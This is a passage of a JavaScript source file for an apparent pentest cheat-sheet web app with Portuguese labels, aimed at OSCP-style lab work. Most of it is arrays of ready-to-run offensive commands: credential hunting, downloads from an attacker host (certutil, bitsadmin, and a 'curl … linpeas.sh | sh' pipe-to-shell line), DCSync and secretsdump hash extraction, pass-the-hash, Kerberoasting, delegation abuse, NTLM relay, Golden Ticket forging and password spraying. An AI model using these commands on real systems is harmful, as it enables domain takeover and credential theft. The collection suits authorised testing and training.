    const sec = sectionEl(group, values, q, profile, activeTag);
    els.commandsContainer.appendChild(sec);
  });

  restoreOpenSections(els.commandsContainer, prevOpen);

  setToggleAllLabel();
}

function resetAll() {
  applyValues({
    ip: "10.10.10.10",
    port: "443",
    url: "",
    domain: "corp.local",
    user: "administrator",
    pass: "Password123!",
    wordlist: "/usr/share/wordlists/rockyou.txt",
    hashfile: "/tmp/hashes.txt",
    lhost: "10.10.14.5",
    lport: "4444",
    iface: "tun0",
    proxy: "socks5://127.0.0.1:1080",
    profile: "all"
  });

  saveJSON(STORE.values, getValues());
  activeTag = "";
  els.cmdSearch.value = "";

  allExpanded = false;
  setToggleAllLabel();

  renderAll();
  toast("Resetado.");
}

function exportAll() {
  const payload = {
    version: "pentestbench_export_v4",
    exportedAt: new Date().toISOString(),
    values: getValues(),
    recipes: getRecipes(),
    workspace: {
      log: els.wsLog.value,
      checklist: els.wsChecklist.value,
      creds: els.wsCreds.value
    }
  };

  const blob = new Blob([JSON.stringify(payload, null, 2)], { type: "application/json;charset=utf-8" });
  const url = URL.createObjectURL(blob);
  const a = document.createElement("a");
  a.href = url;
  a.download = "pentestbench_export.json";
  a.click();
  URL.revokeObjectURL(url);
  toast("Exportado.");
}

async function importAll(file) {
  try {
    const text = await file.text();
    const data = JSON.parse(text);

    if (!data || typeof data !== "object") throw new Error("invalid");

    if (data.values) applyValues(data.values);
    if (Array.isArray(data.recipes)) setRecipes(data.recipes);

    if (data.workspace) {
      els.wsLog.value = data.workspace.log ?? els.wsLog.value;
      els.wsChecklist.value = data.workspace.checklist ?? els.wsChecklist.value;
      els.wsCreds.value = data.workspace.creds ?? els.wsCreds.value;
      persistWorkspace();
    }

    saveJSON(STORE.values, getValues());

    allExpanded = false;
    setToggleAllLabel();

    renderAll();
    toast("Importado.");
  } catch {
    toast("Import inv√°lido.");
  }
}

function persistWorkspace() {
  localStorage.setItem(STORE.ws_log, els.wsLog.value);
  localStorage.setItem(STORE.ws_check, els.wsChecklist.value);
  localStorage.setItem(STORE.ws_creds, els.wsCreds.value);
}

function nowStamp() {
  const d = new Date();
  const pad = (n) => String(n).padStart(2, "0");
  const yyyy = d.getFullYear();
  const mm = pad(d.getMonth() + 1);
  const dd = pad(d.getDate());
  const hh = pad(d.getHours());
  const mi = pad(d.getMinutes());
  const ss = pad(d.getSeconds());
  return `${yyyy}-${mm}-${dd} ${hh}:${mi}:${ss}`;
}

const CHEATS = [
  {
    category: "Linux",
    icon: "üêß",
    note: "P√≥s explora√ß√£o, priorize estabiliza√ß√£o e enum do host antes de pivotar.",
    items: [
      {
        title: "Shell stabilization",
        note: "Primeiras a√ß√µes ap√≥s shell limitada, estabilize para interatividade e conforto.",
        steps: [
          { title: "Checar shell e subir TTY", cmd: "echo $SHELL\npython3 -c 'import pty; pty.spawn(\"/bin/bash\")'\npython3 -c 'import pty; pty.spawn(\"/bin/sh\")'" },
          { title: "Alternativas", cmd: "script -qc /bin/bash /dev/null\nperl -e 'exec \"/bin/bash\";'\nstty rows 40 columns 160" }
        ]
      },
      {
        title: "Enum quick",
        note: "Colete contexto e superf√≠cies de privesc.",
        steps: [
          { title: "Identidade e SO", cmd: "id\nwhoami\nuname -a\ncat /etc/os-release" },
          { title: "Rede e servi√ßos", cmd: "ip a\nss -tulpn\nps aux" },
          { title: "Sudo e SUID", cmd: "sudo -l\nfind / -perm -4000 -type f 2>/dev/null" }
        ]
      },
      {
        title: "File transfer r√°pido",
        note: "Quando curl/wget n√£o existem ou est√£o bloqueados.",
        steps: [
          { title: "Python HTTP server", cmd: "python3 -m http.server 8000\npython -m SimpleHTTPServer 8000" },
          { title: "Baixar sem wget/curl", cmd: "busybox wget http://{attacker_ip}:8000/file\nnc {attacker_ip} 9001 > file" },
          { title: "Base64", cmd: "base64 file > file.b64\nbase64 -d file.b64 > file" },
          { title: "SCP (se tiver SSH)", cmd: "scp file user@{target_ip}:/tmp/\nscp user@{target_ip}:/tmp/file ." }
        ]
      },
      {
        title: "Credential hunting",
        note: "Busca r√°pida por senhas, tokens e configs comuns.",
        steps: [
          { title: "Hist√≥rico e env", cmd: "history\nenv\nprintenv" },
          { title: "Configs comuns", cmd: "grep -R \"pass\\|pwd\\|token\\|key\" /etc 2>/dev/null" },
          { title: "Home dirs", cmd: "ls -la /home\nfind /home -type f \\( -name \"*.conf\" -o -name \"*.env\" -o -name \"*.bak\" \\) 2>/dev/null" },
          { title: "SSH keys", cmd: "find / -name \"id_rsa\" 2>/dev/null\nfind / -name \"authorized_keys\" 2>/dev/null" }
        ]
      },
      {
        title: "Pivot e tunneling",
        note: "Acesso a servi√ßos internos quando existe segmenta√ß√£o.",
        steps: [
          { title: "Port forward SSH", cmd: "ssh -L 8080:127.0.0.1:80 user@{target_ip}" },
          { title: "SOCKS proxy SSH", cmd: "ssh -D 9050 user@{target_ip}" },
          { title: "Proxychains sanity", cmd: "proxychains nmap -sT -Pn 127.0.0.1" }
        ]
      }
    ]
  },
  {
    category: "Windows",
    icon: "ü™ü",
    note: "Enum de host, privil√©gios e servi√ßos. Procure configura√ß√µes inseguras e abuso de paths.",
    items: [
      {
        title: "Host enum",
        note: "Base para privesc e movimenta√ß√£o.",
        steps: [
          { title: "Info", cmd: "whoami\nsysteminfo\nipconfig /all\ntasklist /v" },
          { title: "Privil√©gios", cmd: "whoami /priv\nwhoami /groups" }
        ]
      },
      {
        title: "File transfer",
        note: "Formas nativas de baixar e executar ferramentas.",
        steps: [
          { title: "Certutil", cmd: "certutil -urlcache -f http://{attacker_ip}/file.exe file.exe" },
          { title: "PowerShell IWR", cmd: "iwr http://{attacker_ip}/file.exe -OutFile file.exe" },
          { title: "Bitsadmin", cmd: "bitsadmin /transfer job http://{attacker_ip}/file.exe C:\\Temp\\file.exe" },
          { title: "SMB share", cmd: "net use Z: \\\\{attacker_ip}\\share\ncopy Z:\\file.exe ." }
        ]
      },
      {
        title: "Credenciais e sess√µes",
        note: "Descobrir usu√°rios ativos e credenciais armazenadas.",
        steps: [
          { title: "Sess√µes ativas", cmd: "qwinsta\nquser" },
          { title: "Credenciais salvas", cmd: "cmdkey /list\nvaultcmd /list" },
          { title: "Kerberos tickets", cmd: "klist" }
        ]
      },
      {
        title: "Servi√ßos e permiss√µes",
        note: "Identificar servi√ßos explor√°veis e ACLs fracas.",
        steps: [
          { title: "Listar servi√ßos", cmd: "sc query\nwmic service get name,pathname,startmode" },
          { title: "Unquoted service path", cmd: "wmic service get name,pathname | findstr /i \"Program Files\"" },
          { title: "Permiss√µes de arquivos", cmd: "icacls \"C:\\Program Files\"" }
        ]
      },
      {
        title: "Port forwarding",
        note: "Acesso a servi√ßos internos sem ferramenta extra.",
        steps: [
          { title: "Netsh portproxy", cmd: "netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=127.0.0.1" },
          { title: "Listar regras", cmd: "netsh interface portproxy show all" }
        ]
      }
    ]
  },
  {
    category: "Active Directory",
    icon: "üß©",
    note: "Colete dados para graph e valide acessos SMB e Kerberos.",
    items: [
      {
        title: "Coleta",
        steps: [
          { title: "BloodHound", cmd: "bloodhound-python -d {domain} -u {user} -p \"{pass}\" -ns {ip} -c All" },
          { title: "Shares", cmd: "crackmapexec smb {ip} -u {user} -p \"{pass}\" --shares" }
        ]
      },
      {
        title: "Kerberos",
        steps: [
          { title: "ASREPRoast", cmd: "GetNPUsers.py {domain}/ -dc-ip {ip} -usersfile {wordlist} -no-pass" },
          { title: "Kerberoast", cmd: "GetUserSPNs.py {domain}/{user}:\"{pass}\" -dc-ip {ip} -request" }
        ]
      },
      {
        title: "Preflight (DNS e clock)",
        note: "Evita perder tempo com Kerberos quebrando por resolu√ß√£o/hor√°rio.",
        steps: [
          { title: "Checar DNS e SRV do dom√≠nio", cmd: "nslookup {domain}\ndig +short _ldap._tcp.dc._msdcs.{domain} SRV\nnmap --script dns-srv-enum --script-args 'dns-srv-enum.domain={domain}' -p 53 {dns_ip}" },
          { title: "Checar hora local e ajustar se necess√°rio", cmd: "date\nsudo timedatectl set-ntp true 2>/dev/null || true\nsudo ntpdate -u {dc_ip} 2>/dev/null || true" },
          { title: "Fix r√°pido /etc/hosts (quando DNS atrapalha)", cmd: "sudo sh -c 'echo \"{dc_ip} {dc_host} {domain}\" >> /etc/hosts'\ngetent hosts {domain}\ngetent hosts {dc_host}" }
        ]
      },
      {
        title: "Enum sem cred (high signal)",
        note: "Descobrir dom√≠nio, pol√≠ticas e superf√≠cie sem precisar de usu√°rio.",
        steps: [
          { title: "SMB fingerprint e signing", cmd: "nmap -p445 --script smb-protocols,smb-security-mode,smb2-security-mode {ip}\nnetexec smb {ip} -u '' -p '' --shares" },
          { title: "LDAP base (anon bind quando existir)", cmd: "ldapsearch -x -H ldap://{dc_ip} -s base\nldapsearch -x -H ldap://{dc_ip} -b \"\" -s base namingcontexts" }
        ]
      },
      {
        title: "User discovery (pipeline)",
        note: "Gerar userlist r√°pido e validar com kerbrute.",
        steps: [
          { title: "RID brute / lookupsid", cmd: "impacket-lookupsid {domain}/''@{dc_ip} 2>/dev/null | tee lookupsid.txt\nnetexec smb {ip} -u '' -p '' --rid-brute | tee ridbrute.txt" },
          { title: "Extrair nomes e validar", cmd: "cat ridbrute.txt | awk -F'\\\\\\' '{print $2}' | awk '{print $1}' | sort -u > users.txt\nkerbrute userenum --dc {dc_ip} -d {domain} users.txt | tee kerbrute_users.txt" }
        ]
      },
      {
        title: "Credenciais: testar em tudo (r√°pido)",
        note: "Quando pegar 1 cred, valida em SMB, WinRM, RDP, LDAP e MSSQL.",
        steps: [
          { title: "SMB, WinRM, RDP, LDAP, MSSQL", cmd: "netexec smb {ip} -u {user} -p \"{pass}\"\nnetexec winrm {ip} -u {user} -p \"{pass}\"\nnetexec rdp {ip} -u {user} -p \"{pass}\"\nnetexec ldap {dc_ip} -u {user} -p \"{pass}\"\nnetexec mssql {ip} -u {user} -p \"{pass}\"" },
          { title: "Pass-the-hash (NTLM)", cmd: "netexec smb {ip} -u {user} -H {nthash}\nnetexec winrm {ip} -u {user} -H {nthash}" }
        ]
      },
      {
        title: "Roasting (com p√≥s-processamento)",
        note: "Coleta e deixa pronto para crack offline.",
        steps: [
          { title: "ASREPRoast (sem senha)", cmd: "GetNPUsers.py {domain}/ -dc-ip {dc_ip} -usersfile users.txt -no-pass -outputfile asrep.hashes" },
          { title: "Kerberoast (com cred)", cmd: "GetUserSPNs.py {domain}/{user}:\"{pass}\" -dc-ip {dc_ip} -request -outputfile kerberoast.hashes" },
          { title: "Hashcat exemplos (ajuste wordlist)", cmd: "hashcat -m 18200 asrep.hashes {wordlist}\nhashcat -m 13100 kerberoast.hashes {wordlist}" }
        ]
      },
      {
        title: "AD CS (certipy)",
        note: "Misconfig de templates pode encerrar o lab muito r√°pido.",
        steps: [
          { title: "Find e enum", cmd: "certipy find -u {user} -p \"{pass}\" -dc-ip {dc_ip} -vulnerable -enabled | tee certipy_find.txt" },
          { title: "Request (quando achar template explor√°vel)", cmd: "certipy req -u {user} -p \"{pass}\" -dc-ip {dc_ip} -template {template} -upn {target_upn} -ca {ca_name}" }
        ]
      },
      {
        title: "Responder (captura)",
        note: "S√≥ use quando fizer sentido no cen√°rio e voc√™ estiver pronto para receber conex√µes.",
        steps: [
          { title: "Subir Responder", cmd: "sudo responder -I {iface} -dwv" },
          { title: "Checar se SMB signing dificulta relay", cmd: "nmap -p445 --script smb2-security-mode {ip}" }
        ]
      },
      {
        title: "BloodHound: checklist de an√°lise",
        note: "N√£o √© coleta, √© o que voc√™ procura primeiro no grafo.",
        steps: [
          { title: "O que procurar primeiro", cmd: "Shortest Paths to Domain Admins\nUsers with Local Admin Rights\nKerberoastable / ASREPRoastable\nDCSync Rights\nInteresting ACLs (GenericAll/WriteDACL/WriteOwner)\nGPO abuse candidates" }
        ]
      },
      {
        title: "Troubleshooting r√°pido",
        note: "Erros comuns que travam Kerberos e LDAP.",
        steps: [
          { title: "KRB_AP_ERR_SKEW (clock)", cmd: "sudo ntpdate -u {dc_ip} 2>/dev/null || true\ndate" },
          { title: "Cannot find KDC / DNS ruim", cmd: "dig +short {domain}\ndig +short _kerberos._tcp.{domain} SRV\ncat /etc/resolv.conf" },
          { title: "Formato de usu√°rio", cmd: "Exemplos:\n{domain}\\\\{user}\n{user}@{domain}\n{domain}/{user}" }
        ]
      },
      {
        title: "DCSync e secretsdump",
        note: "Se tiver DA, Enterprise Admin ou DCSync rights. Extrair hashes de todo o dom√≠nio.",
        steps: [
          { title: "DCSync full (todos os hashes)", cmd: "secretsdump.py {domain}/{user}:\"{pass}\"@{dc_ip} -just-dc -outputfile dcsync_full" },
          { title: "DCSync s√≥ NTLM", cmd: "secretsdump.py {domain}/{user}:\"{pass}\"@{dc_ip} -just-dc-ntlm -outputfile dcsync_ntlm" },
          { title: "DCSync com hash (PtH)", cmd: "secretsdump.py {domain}/{user}@{dc_ip} -hashes :{nthash} -just-dc-ntlm" },
          { title: "Dump remoto de host (n√£o DC)", cmd: "secretsdump.py {domain}/{user}:\"{pass}\"@{ip}" },
          { title: "S√≥ krbtgt (para Golden Ticket)", cmd: "secretsdump.py {domain}/{user}:\"{pass}\"@{dc_ip} -just-dc-user krbtgt" }
        ]
      },
      {
        title: "Lateral movement (execu√ß√£o remota)",
        note: "Ferramentas Impacket para shell remota. Escolha conforme permiss√µes.",
        steps: [
          { title: "psexec (cria servi√ßo, mais ruidoso)", cmd: "psexec.py {domain}/{user}:\"{pass}\"@{ip}" },
          { title: "wmiexec (mais silencioso)", cmd: "wmiexec.py {domain}/{user}:\"{pass}\"@{ip}" },
          { title: "smbexec (sem bin√°rio no disco)", cmd: "smbexec.py {domain}/{user}:\"{pass}\"@{ip}" },
          { title: "evil-winrm (precisa 5985/5986 aberto)", cmd: "evil-winrm -i {ip} -u {user} -p \"{pass}\"" },
          { title: "PtH via psexec", cmd: "psexec.py {domain}/{user}@{ip} -hashes :{nthash}" },
          { title: "PtH via wmiexec", cmd: "wmiexec.py {domain}/{user}@{ip} -hashes :{nthash}" },
          { title: "PtH via evil-winrm", cmd: "evil-winrm -i {ip} -u {user} -H {nthash}" }
        ]
      },
      {
        title: "Delegation attacks",
        note: "Unconstrained, Constrained (S4U) e RBCD.",
        steps: [
          { title: "Achar unconstrained delegation", cmd: "ldapsearch -x -H ldap://{dc_ip} -D '{user}@{domain}' -w '{pass}' -b 'DC=corp,DC=local' '(userAccountControl:1.2.840.113556.1.4.803:=524288)' sAMAccountName" },
          { title: "Achar constrained delegation", cmd: "ldapsearch -x -H ldap://{dc_ip} -D '{user}@{domain}' -w '{pass}' -b 'DC=corp,DC=local' '(msDS-AllowedToDelegateTo=*)' sAMAccountName msDS-AllowedToDelegateTo" },
          { title: "Explorar constrained (S4U)", cmd: "getST.py -spn {target_spn} -impersonate administrator {domain}/{user}:\"{pass}\" -dc-ip {dc_ip}\nexport KRB5CCNAME=administrator.ccache" },
          { title: "RBCD: criar machine account", cmd: "addcomputer.py -computer-name 'EVIL$' -computer-pass 'EvilPass123!' -dc-ip {dc_ip} {domain}/{user}:\"{pass}\"" },
          { title: "RBCD: configurar delegation", cmd: "rbcd.py -delegate-to '{target_computer}$' -delegate-from 'EVIL$' -action write -dc-ip {dc_ip} {domain}/{user}:\"{pass}\"" },
          { title: "RBCD: obter ticket", cmd: "getST.py -spn cifs/{target_computer}.{domain} -impersonate administrator -dc-ip {dc_ip} {domain}/'EVIL$':'EvilPass123!'\nexport KRB5CCNAME=administrator.ccache" }
        ]
      },
      {
        title: "GPP Passwords e SYSVOL",
        note: "MS14-025. cPassword em XMLs do SYSVOL √© crack trivial.",
        steps: [
          { title: "netexec module", cmd: "netexec smb {dc_ip} -u {user} -p \"{pass}\" -M gpp_password\nnetexec smb {dc_ip} -u {user} -p \"{pass}\" -M gpp_autologin" },
          { title: "Manual (buscar no SYSVOL)", cmd: "smbclient //{dc_ip}/SYSVOL -U \"{user}%{pass}\" -c 'recurse; ls'" },
          { title: "Decrypt cPassword", cmd: "gpp-decrypt {cpassword_value}" }
        ]
      },
      {
        title: "Coer√ß√£o de autentica√ß√£o",
        note: "For√ßar host a autenticar contra seu Responder/relay.",
        steps: [
          { title: "PetitPotam (unauthenticated)", cmd: "PetitPotam.py {lhost} {dc_ip}" },
          { title: "PetitPotam (com cred)", cmd: "PetitPotam.py -u {user} -p \"{pass}\" -d {domain} {lhost} {dc_ip}" },
          { title: "NTLM relay (se signing desabilitado)", cmd: "netexec smb {ip}/24 --gen-relay-list relay_targets.txt\nntlmrelayx.py -tf relay_targets.txt -smb2support" }
        ]
      },
      {
        title: "Golden/Silver Ticket",
        note: "Com krbtgt hash (Golden) ou machine hash (Silver) voc√™ forja tickets.",
        steps: [
          { title: "Golden Ticket (precisa krbtgt hash + domain SID)", cmd: "ticketer.py -nthash {krbtgt_hash} -domain-sid {domain_sid} -domain {domain} administrator\nexport KRB5CCNAME=administrator.ccache\npsexec.py -k -no-pass {domain}/administrator@{dc_host}" },
          { title: "Silver Ticket (machine hash)", cmd: "ticketer.py -nthash {machine_hash} -domain-sid {domain_sid} -domain {domain} -spn cifs/{target_computer}.{domain} administrator\nexport KRB5CCNAME=administrator.ccache" }
        ]
      },
      {
        title: "ACL abuse (GenericAll/WriteDACL/WriteOwner)",
        note: "BH mostra as ACLs explor√°veis. Execute conforme o tipo.",
        steps: [
          { title: "GenericAll sobre user ‚Üí reset senha", cmd: "net rpc password {target_user} '{new_pass}' -U {domain}/{user}%'{pass}' -S {dc_ip}" },
          { title: "WriteDACL ‚Üí adicionar DCSync rights", cmd: "# PowerView: Add-DomainObjectAcl -TargetIdentity 'DC=corp,DC=local' -PrincipalIdentity {user} -Rights DCSync\n# Depois: secretsdump.py {domain}/{user}:\"{pass}\"@{dc_ip} -just-dc-ntlm" },
          { title: "GenericAll sobre group ‚Üí adicionar membro", cmd: "net rpc group addmem '{target_group}' {user} -U {domain}/{user}%'{pass}' -S {dc_ip}" }
        ]
      },
      {
        title: "Password spraying (AD context)",
        note: "1 senha em muitos users. Respeite lockout. Tente varia√ß√µes comuns.",
        steps: [
          { title: "Checar lockout policy", cmd: "netexec smb {dc_ip} -u {user} -p \"{pass}\" --pass-pol" },
          { title: "Spray via SMB", cmd: "netexec smb {dc_ip} -u users.txt -p \"{pass}\" --continue-on-success | tee spray.txt" },
          { title: "Spray via Kerberos (mais silencioso)", cmd: "kerbrute passwordspray --dc {dc_ip} -d {domain} users.txt \"{pass}\"" }
        ]
      }

    ]
  },
  {
    category: "Wordlists",
    icon: "‚öõÔ∏è",
    note: "Wordlists √∫teis",
    items: [
      {
        title: "Wordlists que podem ser √∫teis para descoberta de conte√∫do.",
        steps: [
          { title: "Wordlists", cmd: "/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\n/usr/share/seclists/Discovery/Web-Content/raft-large-directories-lowercase.txt\n/usr/share/seclists/Discovery/Web-Content/common.txt\n/usr/share/seclists/Discovery/Web-Content/big.txt\n/usr/share/seclists/Discovery/Web-Content/raft-large-files.txt\n/usr/share/seclists/Discovery/Web-Content/raft-large-words.txt" }
        ]
      },
      {
        title: "Useful wordlists for hash cracking and brute-forcing",
        steps: [
          { title: "Wordlists base", cmd: "/usr/share/wordlists/rockyou.txt\n/usr/share/wordlists/seclists/Passwords/Common-Credentials/Pwdb_top-10000000.txt\n/usr/share/wordlists/seclists/Passwords/xato-net-10-million-passwords-1000000.txt" },
          { title: "Espec√≠ficas", cmd: "/usr/share/wordlists/seclists/Passwords/Common-Credentials/Pwdb_top-1000.txt\n/usr/share/wordlists/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt\n/usr/share/wordlists/seclists/Passwords/Common-Credentials/probable-v2_top-1575.txt\n/usr/share/wordlists/seclists/Passwords/Common-Credentials/best1050.txt" }
        ]
      }
    ]
  }
];

const OSCP_STANDALONE_CHECKLIST = [
  {
    category: "Recon inicial e acesso",
    icon: "üß≠",
    items: [
      {
        id: "recon_tcp_full",
        title: "Scan completo de todas as portas TCP",
        hint: "Full TCP primeiro, depois refine com -sV/-sC nas portas encontradas. Salve outputs.",
        cmd: "nmap -p- -Pn {ip} -v --min-rate 1000 --max-rtt-timeout 1000ms --max-retries 5 -oN nmap_ports.txt"
      },
      {
        id: "recon_sv_sc",
        title: "Fingerprinting: servi√ßos, vers√µes e scripts default",
        hint: "Rode -sV -sC, valide banner/headers, e confira cada porta TCP que apareceu no full scan.",
        cmd: "nmap -Pn {ip} -sV -sC -v -oN nmap_sVsC.txt"
      },
      {
        id: "recon_vuln_scripts",
        title: "Nmap vuln scripts (quando fizer sentido)",
        hint: "Use como apoio, n√£o como verdade absoluta. Cuidado em alvo inst√°vel.",
        cmd: "nmap -T5 -Pn {ip} -v --script vuln -oN nmap_vuln.txt"
      },
      {
        id: "recon_rustscan",
        title: "Rustscan (alternativa r√°pida) ‚Üí Nmap",
        hint: "√ötil quando voc√™ quer velocidade e ainda quer sa√≠da compat√≠vel.",
        cmd: "rustscan --ulimit 5000 -a {ip} -- -sC -sV -Pn -oN nmap_full"
      },
      {
        id: "recon_web_enum_wordlists",
        title: "Enumerar web com wordlists relevantes",
        hint: "Dir + files + extens√µes. Ajuste filtros (404, tamanho, regex) e fa√ßa recurs√£o leve.",
        cmds: [
          "ffuf -u {url}/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -recursion -recursion-depth 1 -o dirs",
          "ffuf -u {url}/FUZZ -w /usr/share/seclists/Discovery/Web-Content/big.txt -recursion -recursion-depth 1",
          "ffuf -u {url}/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -recursion -recursion-depth 1",
          "ffuf -u {url}/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt -recursion -recursion-depth 1"
        ]
      },
      {
        id: "recon_fingerprint_full",
        title: "Fingerprinting completo do web/app",
        hint: "Wappalyzer, CMS, headers, robots, sitemap, vers√µes, endpoints, m√©todos e valida√ß√µes.",
        cmds: [
          "curl -i {url}/",
          "curl -s {url}/robots.txt",
          "curl -s {url}/sitemap.xml"
        ]
      },
      {
        id: "recon_public_exploits",
        title: "Checar exploits p√∫blicos (Exploit-DB e Google)",
        hint: "Baseado em vers√£o real confirmada. Busque tamb√©m PoCs e bypasses.",
        cmds: [
          "searchsploit <software> <version>",
          "searchsploit -m <EDB-ID>"
        ]
      },
      {
        id: "recon_rescan_if_stuck",
        title: "Rescan e valida√ß√£o quando travar",
        hint: "Se ficar preso, volte um passo: refa√ßa full scan, confirme flags, confirme conectividade e hip√≥teses.",
        cmds: [
          "# Refazer full TCP (confirmar que n√£o perdeu porta):",
          "nmap -p- -Pn {ip} -v --min-rate 500 -oN rescan.txt",
          "# UDP top 200 (se n√£o rodou):",
          "sudo nmap -sU --top-ports 200 -T4 {ip} -oN rescan_udp.txt",
          "# Checar conectividade e rota:",
          "ping -c 2 {ip}",
          "traceroute {ip} 2>/dev/null || tracepath {ip}",
          "# Refuzar web com wordlist diferente e extens√µes novas:",
          "ffuf -u {url}/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt -t 50 -e php,asp,aspx,jsp,html,txt,bak,old,conf -fc 404"
        ]
      },
      {
        id: "recon_udp_top",
        title: "Checar UDP (top ports)",
        hint: "Nem sempre √© necess√°rio, mas pode destravar servi√ßos importantes.",
        cmd: "sudo nmap -sU --top-ports 200 {ip} -oN nmap_udp_top.txt"
      }
    ]
  },

  {
    category: "Web Content Discovery",
    icon: "üåê",
    items: [
      {
        id: "web_dirs",
        title: "Fuzz de diret√≥rios (recurs√£o leve)",
        hint: "Comece com dirs, depois files. Sempre ajuste filtro por status/tamanho.",
        cmds: [
          "ffuf -u {url}/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -recursion -recursion-depth 1 -o dirs_common",
          "ffuf -u {url}/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories-lowercase.txt -recursion -recursion-depth 1 -o dirs_raft"
        ]
      },
      {
        id: "web_files",
        title: "Fuzz de arquivos (com extens√µes)",
        hint: "Use extens√µes alinhadas com a stack. Inclua txt/json/config quando fizer sentido.",
        cmds: [
          "ffuf -u {url}/FUZZ -w /usr/share/seclists/Discovery/Web-Content/big.txt -t 50 -e php,html -o files_big",
          "ffuf -u {url}/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -t 50 -e php,asp,aspx,jsp,html,txt,json",
          "ffuf -u {url}/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt -t 50 -e php,asp,aspx,jsp,html,txt,json"
        ]
      },
      {
        id: "web_parse_ffuf",
        title: "Parse do ffuf (jq) para revisar melhor",
        hint: "Ordene por status e URL para revisar r√°pido.",
        cmds: [
          "cat dirs | jq -r '.results[] | [.status, .url] | @tsv' | sort",
          "cat files | jq -r '.results[] | [.status, .url] | @tsv' | sort"
        ]
      },
      {
        id: "web_wordlists",
        title: "Wordlists padr√£o (caminhos √∫teis)",
        hint: "Tenha atalho mental de onde est√£o.",
        cmds: [
          "ls -la /usr/share/seclists/Discovery/Web-Content/common.txt",
          "ls -la /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt",
          "ls -la /usr/share/seclists/Discovery/Web-Content/raft-large-directories-lowercase.txt",
          "ls -la /usr/share/seclists/Discovery/Web-Content/big.txt",
          "ls -la /usr/share/seclists/Discovery/Web-Content/raft-large-files.txt",
          "ls -la /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt"
        ]
      }
    ]
  },

  {
    category: "Estabiliza√ß√£o de shell e enum em massa",
    icon: "üß®",
    items: [
      {
        id: "sh_shells",
        title: "Checar shells dispon√≠veis",
        hint: "√ötil para upgrades e compatibilidade.",
        cmd: "cat /etc/shells"
      },
      {
        id: "sh_ps1",
        title: "PS1 mais leg√≠vel (cores)",
        hint: "Melhora visibilidade e reduz erro bobo.",
        cmd: "PS1='\\[\\e[31m\\]\\u\\[\\e[96m\\]@\\[\\e[35m\\]\\H\\[\\e[0m\\]:\\[\\e[93m\\]\\w\\[\\e[0m\\]\\$ '"
      },
      {
        id: "sh_tty_upgrade",
        title: "Upgrade de TTY (python) + raw mode",
        hint: "Padr√£o cl√°ssico: spawn ‚Üí Ctrl+Z ‚Üí raw -echo ‚Üí fg ‚Üí ajustar rows/cols.",
        cmds: [
          "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'",
          "python -c 'import pty;pty.spawn(\"/bin/bash\")'",
          "stty -a",
          "stty raw -echo; fg",
          "stty rows 29 cols 237",
          "export TERM=xterm-256color"
        ]
      },
      {
        id: "sh_mass_enum",
        title: "Mass enum (linpeas + lse) e logs",
        hint: "Salve output e revise com calma. Use less -R para cores.",
        cmds: [
          "/tmp/test/linpeas.sh | tee linpeas.log && /tmp/test/lse.sh -i | tee lse.log",
          "cat *.log",
          "less -R *.log"
        ]
      },
      {
        id: "sh_grab_files",
        title: "Puxar arquivos de enum via wget (quando aplic√°vel)",
        hint: "Ajuda a baixar diret√≥rio servido por HTTP simples.",
        cmds: [
          "wget -nH -r http://10.13.31.108/ && rm -f index.html",
          "chmod +x *.sh"
        ]
      }
    ]
  },

  {
    category: "Linux PrivEsc",
    icon: "üêß",
    items: [
      {
        id: "lin_run_tools",
        title: "Rodar LinPEAS e (opcional) LSE",
        hint: "Isso normalmente entrega 80% do caminho. Salve output e revise devagar.",
        cmds: [
          "# Upload e execu√ß√£o:",
          "curl -L http://{lhost}:{lport}/linpeas.sh | sh | tee linpeas.log",
          "# Ou baixar e rodar:",
          "wget http://{lhost}:{lport}/linpeas.sh -O /tmp/linpeas.sh && chmod +x /tmp/linpeas.sh && /tmp/linpeas.sh | tee /tmp/linpeas.log",
          "# LSE (Linux Smart Enumeration):",
          "wget http://{lhost}:{lport}/lse.sh -O /tmp/lse.sh && chmod +x /tmp/lse.sh && /tmp/lse.sh -i | tee /tmp/lse.log",
          "# Revisar com cores:",
          "less -R /tmp/linpeas.log"
        ]
      },
      {
        id: "lin_sudo",
        title: "Checar sudo",
        hint: "Primeiro quick win. Olhe comandos, paths e vari√°veis.",
        cmd: "sudo -l"
      },
      {
        id: "lin_kernel",
        title: "Checar kernel e distro",
        hint: "Para hip√≥teses de exploit e compatibilidade de payload.",
        cmds: [
          "uname -sr",
          "uname -a",
          "lsb_release -a 2>/dev/null",
          "cat /etc/os-release"
        ]
      },
      {
        id: "lin_suid_sgid",
        title: "Encontrar SUID/SGID e validar GTFOBins",
        hint: "Procure bin√°rios fora do comum. Use strings quando fizer sentido.",
        cmds: [
          "find / -type f -perm -04000 -ls 2>/dev/null",
          "find / -type f -perm -02000 -ls 2>/dev/null"
        ]
      },
      {
        id: "lin_cron",
        title: "Cronjobs e timers",
        hint: "Jobs como root e scripts grav√°veis s√£o ouro.",
        cmds: [
          "cat /etc/crontab",
          "ls -la /etc/cron*",
          "cat /etc/cron* 2>/dev/null",
          "ls -la /etc/cron.d",
          "cat /var/spool/cron/* 2>/dev/null"
        ]
      },
      {
        id: "lin_process",
        title: "Processos e pspy",
        hint: "Observe jobs que rodam como root e scripts chamando paths relativos.",
        cmds: [
          "ps aux | grep root",
          "./pspy64"
        ]
      },
      {
        id: "lin_ports",
        title: "Portas internas abertas",
        hint: "Pode indicar servi√ßos locais √∫teis para privesc/pivot.",
        cmds: [
          "ss -lntu",
          "ss -ltu"
        ]
      },
      {
        id: "lin_group_user_files",
        title: "Writable por user/group",
        hint: "Procure diret√≥rios e arquivos grav√°veis fora do esperado.",
        cmds: [
          "id",
          "groups",
          "find / -writable -type d 2>/dev/null",
          "find / -writable -type f 2>/dev/null"
        ]
      },
      {
        id: "lin_caps",
        title: "Capabilities habilitadas",
